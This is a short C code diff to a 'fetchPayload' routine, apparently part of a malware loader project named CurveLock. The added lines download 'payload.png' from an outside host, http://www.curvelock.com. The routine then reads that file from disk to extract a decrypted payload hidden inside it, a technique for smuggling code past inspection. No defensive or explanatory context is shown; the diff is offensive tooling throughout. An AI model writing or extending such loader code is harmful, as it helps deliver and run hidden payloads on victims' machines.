@@ -284,8 +284,17 @@ BOOL fetchPayload() {
 
 	printf("[i] Extracting Payload from PNG File \n");
 
+	// URL of the PNG file
+	LPCSTR url = "http://www.curvelock.com/payload.png";
+	LPCSTR localFile = "payload.png";
+
+	// Download the PNG file from the URL
+	if (!DownloadFile(url, localFile)) {
+		return -1;
+	}
+
 	// Read PNG file from disk
-	if (!ReadFileFromDiskA("CurveLock.png", &pPngFileBuffer, &sPngFileSize))
+	if (!ReadFileFromDiskA("payload.png", &pPngFileBuffer, &sPngFileSize))
 		return -1;
 
 	// Extract decrypted payload from PNG file
